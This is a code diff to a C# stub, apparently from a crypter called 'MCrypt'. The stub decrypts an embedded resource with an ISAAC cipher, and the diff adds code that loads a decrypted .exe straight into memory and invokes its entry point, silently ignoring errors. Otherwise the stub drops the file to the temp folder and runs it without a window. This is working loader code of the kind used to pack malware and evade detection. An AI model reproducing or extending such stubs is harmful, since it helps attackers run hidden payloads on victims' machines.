@@ -19,14 +19,25 @@ namespace MCrypt.Stub
             var fileBytes = ReadFully(resourceStream);
 
             var cipher = new IsaacRandom(decryptionGuid);
-            for(int i = 0; i < fileBytes.Length; i++)
+            for (int i = 0; i < fileBytes.Length; i++)
             {
                 fileBytes[i] -= cipher.NextByte();
             }
 
+
+            try
+            {
+                if (resourceName.EndsWith(".exe"))
+                {
+                    var asm = Assembly.Load(fileBytes);
+                    asm.EntryPoint.Invoke(null, new string[0]);
+                    return;
+                }
+            } catch(Exception e)
+            {}
+
             var outPath = Path.Combine(Path.GetTempPath(), resourceName);
             File.WriteAllBytes(outPath, fileBytes);
-
             Process p = new Process();
             p.StartInfo.CreateNoWindow = true;
             p.StartInfo.UseShellExecute = true;
